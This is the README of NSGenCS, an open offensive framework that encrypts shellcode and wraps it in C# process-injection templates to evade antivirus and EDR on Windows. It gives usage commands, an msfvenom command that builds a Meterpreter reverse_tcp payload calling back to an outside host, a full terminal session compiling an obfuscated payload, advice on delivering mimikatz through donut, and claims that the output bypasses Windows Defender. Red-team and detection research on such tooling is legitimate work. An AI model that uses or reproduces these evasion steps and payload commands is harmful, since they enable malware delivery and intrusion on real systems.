# NSGenCS
# What Is?

An extremely simple, yet extensible framework to evade AV with obfuscated payloads under Windows. 

# Installation Requirements

Python3

.NET

# Running

Simple method :

`python NSGenCS.py file <payload> -method <Obfuscation Method> -key <encryption/decryption key if required>`

Should generate `payload.exe`

# Options

| Option | Usage | Default |
|--------|-------|---------|
|   -file     |  C# file with byte[] buf *NOTE* if you see errors, please check the variable is called buf and not my_buf (from Donut) for example     |       Req'd  |
|     -key   |  Key for payload encryption/decryption (example: 0xff) *NOTE* no validation is done on key value     |  false      | 
|   -method     |    Payload encryption method folder name (currently xor and reverse)   |   Req'd      |
| -template       |  Delivery Template Directory for inserting payload and decryption into   |  APC_Inj_New       | 
|  -shellcode      |   Shellcode Template Directory for shellcode modification file    |    ShellcodeTemplate     |
|     -out    | Output Filename      | Payload.exe        | 
|   -h     | Show help file      |         |

  
  
# How do?

This is a two-stage process. The first takes your input file and obfuscates it according to your chosen method. Initially I have implemented two simple ones, the idea is that this will be an extensible framework that gives you the ability to customise it to your heart's content.

If we look at the two simple methods, `xor` and `reverse`, both folders contain an `encrypt.txt` and a `decrypt.txt`. These are C# files that contain the transformations that you wish to apply to your code. In the case of `reverse` this is just `Array.Reverse(buf);` These can be as complicated or as simple as you wish. 

For the XOR method, a key is required with which to XOR the input file which is passed on the command line.

These code snippets and placed in the ShellcodeTemplate which will then output your modified code ready to pass to the delivery template.

The modified code is placed in the delivery template along with the instructions from `decrypt.txt` which is then compiled and your payload generated. You can create a template that uses syscalls for example, package it with DInvoke and Fody, change the process you inject into, change the entire delivery method from process injection for example.

You have complete freedom to create new delivery templates and new payload obfuscation methods 

# Templates

To show how easy it is to modify templates, I borrowed the templates from pwndizzle (https://github.com/pwndizzle/c-sharp-memory-injection). 

Modifications took less than a minute : 

1. Download existing template to its own folder, rename it to template and add the payload.csproj to the folder. 9 times out of 10 you can just copy an existing payload.csproj from one of the exiting templates, however if your delivery template has sopecifc requirements such as `System.EnterpriseServices` then some configuration will be required. The folder name will become the parameter you pass via -template

![image](https://user-images.githubusercontent.com/21687763/130445515-a0ffcbe4-eca5-4a32-8d75-18e3002a3533.png)

2. Open the template file and locate where current shellcode is stored : 

![image](https://user-images.githubusercontent.com/21687763/130443791-5641840b-152d-4c1d-a42d-16fab749fe78.png)

3. Note that in this case the shellcode is stored in a variable called `payload`
4. Search and replace `payload` with `buf` (please see notes below)
5. Delete current payload
6. Add SHELLCODEHERE and DECRYPTHERE

![image](https://user-images.githubusercontent.com/21687763/130444100-d9a1bd8c-35a4-4146-a76f-4591d9cd1d5f.png)


That's it! Now compile it remembering to use -template followed by the folder name you installed the new template into. I used the output from `c:\metasploit-framework\bin\msfvenom.bat -p windows/x64/meterpreter/reverse_tcp -f csharp LPORT=4444 LHOST=192.168.1.84 -o meterpreter.cs`

Now you have to understand what your delivery template is doing, and it's requirements. For example the Thread_hijack takes a command line parameter for the process you wish to inject into - I used notepad in this example. Let's see how it gets on with a fully patched and upto date Windows 10 with Defender : 

![image](https://user-images.githubusercontent.com/21687763/130779484-bf024b91-0665-43ba-8fd6-1f3ad929b5cc.png)

Perfect!

You can extend the existing templates or add your own in their own folder to include other defensive measures if you want.

# Encrypt/Decrypt

The two simple examples used don't really show the extensibility of the framework. Want to prepend code to your shellcode? This is where you can do it. 

You could even add code for in-memory decryption. Use the `encrypt` file to generate to encrypted payload and use `decrypt` to add some in memory decryption code at the beginning of the payload you are looking to inject. Alternatively add it before the transform in the `encrypt` function and let `decrypt` only perform decryption. 

A simple example of how to add a 1000 byte NOP sled before your payload is included in the NOPSled method:

```
    		Array.Reverse(buf);
		Array.Resize(ref buf, (buf.Length) + 1000);
		Array.Reverse(buf);
		for (int j = 0; j < 1000 ; j++)
                {
                    buf[j] = (byte)((uint) 0x90);
                }
```
If you want to use AES encryption or the like, make sure that you ensure that you add the appropriate `using` to the necessary files such as `using System.Security.Cryptography;`. You can use  `KEYHERE` and `-key` for a static key or even key it to a hostname or something if you want to use a more targeted approach.

There is a DLL Injection template provided, however this doesn't take a payload as such, it takes a filename. I haven't modified this template to take the parameters from any of the methods, it's left as is so you can experiment with it. You don't need SHELLCODEHERE, ENCRYPTHERE or DECRYPTHERE, you just need to pass a string to it. You could just replace line 74 with `        string dllName = "KEYHERE";`. Create a new obfuscation method called 'Filename' and have blank encrypt and decrypt files. Or something like that - have a play :)

# Donut

You can also use the awesome donut framework (https://github.com/TheWover/donut) to create payloads for use with the framework such as mimikatz : 

`donut -a 2 -f 7 -z 2 file.exe` will generate a loader.cs that you can use - PLEASE CHANGE THE VARIABLE NAME FROM my_buf to buf!!

You can deliver nearly anything using a combination of donut and NSGenCS. donut is the closest framework to magic as far as I can tell. Want to deliver a tool that is detected but not a shellcode/beacon? Go for it - drop it using this framework and the donut loader.cs. Just make sure you use a delivery template that supports console out if you need it and specify any command line options you require (such as an output file if you don't have a template that supports console output) using the `-p"my command line options here"` flag in donut.

# Pointless Functionality (Triggers AV Currently)

Also supplied is the PE_Load template adopted from Casey Smith's (@subTee) and a utility called PE2CS. The PE_LOAD template triggers Defender so use with caution!

![image](https://user-images.githubusercontent.com/21687763/130750571-b992a951-d32b-49cd-8fb9-778ce54aca88.png)

Want to reflectively load a PE file? Well now you can if you need to.

It's as simple as just `PE2CS inputfile.exe > outputfile.cs` and use the `outputfile.cs` as your C# input file.

Hopefully this shows how you can use templates from all sorts of different projects, drop them in this framework and with a few minor adjustments, you're good to go.

# PE2CS

The included utility PE2CS will also convert any raw shellcode into the correct format to use with NSGENCS. Here we take the raw output from MSFVenom and parse it using PE2CS:

```
C:\Tools\NSGenCS>c:\metasploit-framework\bin\msfvenom.bat -p windows/x64/messagebox TEXT=NSGENCS TITLE=NSGENCS -f raw > msgbox.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 283 bytes


C:\Tools\NSGenCS>pe2cs msgbox.bin > msgbox.cs

C:\Tools\NSGenCS>python NSGenCS.py -file msgbox.cs -method xor -key 0x55 -out p3.exe



███╗   ██╗███████╗ ██████╗ ███████╗███╗   ██╗ ██████╗███████╗
████╗  ██║██╔════╝██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔════╝
██╔██╗ ██║███████╗██║  ███╗█████╗  ██╔██╗ ██║██║     ███████╗
██║╚██╗██║╚════██║██║   ██║██╔══╝  ██║╚██╗██║██║     ╚════██║
██║ ╚████║███████║╚██████╔╝███████╗██║ ╚████║╚██████╗███████║
╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝

NS Payload Encryptor by @bb_hacks                                                                                       

> Creating encoded shellcode from CS file
> Generating payload
> Cleanup
Microsoft (R) Build Engine version 16.10.2+857e5a733 for .NET
Copyright (C) Microsoft Corporation. All rights reserved.

  Determining projects to restore...
  Restored C:\Tools\NSGenCS\APC_Inj_New\Payload.csproj (in 94 ms).
  Payload -> C:\Tools\NSGenCS\APC_Inj_New\bin\Release\net45\win10-x64\Payload.exe
  Payload -> C:\Tools\NSGenCS\APC_Inj_New\bin\Release\net45\win10-x64\publish\
        1 file(s) copied.

You should see p3.exe now

C:\Tools\NSGenCS>p3.exe
```

![image](https://user-images.githubusercontent.com/21687763/130922971-cb942533-87b1-4781-a480-065fd1ef0b5d.png)

Simples!

# Notes

Templates are provided just to give you an idea of how easy it is to modify existing templates or write your own. 

Please don't raise issues because Thread_Hijack doesn't play nicely with stageless Meterpreter or something! Understand the template you are using and how it interacts with the target system *and* your payload. I will close them and you will be sad.

Equally please don't raise an issue if your new delivery template doesn't compile because of the .csproj. Look at my code - do I look like I will be able to fix the problem? I'm barely scraping by here :)

Understand your target environment - don't use a Meterpreter payload on a system that does in memory scanning for example. It will fail. And you will be sad. 

You will also be sad if you just run `payload.exe notepad` all the time if there isn't a notepad instance running. 

If you don't clean up a lot of the ConsoleWriteLines in the provided templates, you are going to be extremely noisy. This too will make you sad.

If you don't rename the shellcode variable to buf (for example Donut outputs the file with my_buf as the variable) then you will see lots of red error messages when running NSGenCS. This will make you sad also. It will probably look something like this: 

![image](https://user-images.githubusercontent.com/21687763/131107929-0b460516-9d2c-4f66-9895-953f01a4044c.png)

Guess what - if you use a delivery template that uses ResumeThread with Mimikatz and Defender, you will be sad.

Don't be sad.

This framework has been successfully tested with multiple delivery templates allowing bypasses of multiple AV and EDR endpoints. Please feel free to add templates and methods, I would love to see this become a community supported project. I would definitely not be sad if that happened.

# TO-DO

Check that the payload file variable is `buf` & do regex witchcraft to replace it if not. Some templates already use the `buf` so ideally, in v2 it can be worked to use a unique variable name.

Check if encrypt/decrypt files have a KEYHERE placeholder and alert/break if -key not supplied

Add a -noclean switch to not clean up after execution for debugging purposes

Organise payloads and templates into their own folders for neatness

Bit more error checking and breaks if things go sad

# Blue Team

Since the payloads and templates vary so much and templates can be grabbed from anywhere, I have struggled to come up with a good way of detecting this. The framework isn't the thing to trigger on, it will be the methodology employed by the template. I strongly suggest that behavioural detection will be the best way to get visibility of these payloads executing in your environment, but if there are ideas on how to help out #TeamBlue then please let me know and I can up date this file. In memory scanning will pick up things like Meterpreter but if you are using a payload that supports in memory obfuscation - well it's really tough.

# Credits 

@mhaskar for so much work cleaning the code up. I am not a good/clean/organised/competent coder, before he got his hands on my code it looked like an accident in an alphabet soup factory.

https://github.com/TheWover/donut for such an incredible tool

https://github.com/smokeme/payloadGenerator for the inspiration and base code - I just couldn't get it working with the .NET dependencies which was my fault, so created this instead

https://github.com/pwndizzle/c-sharp-memory-injection for the example templates
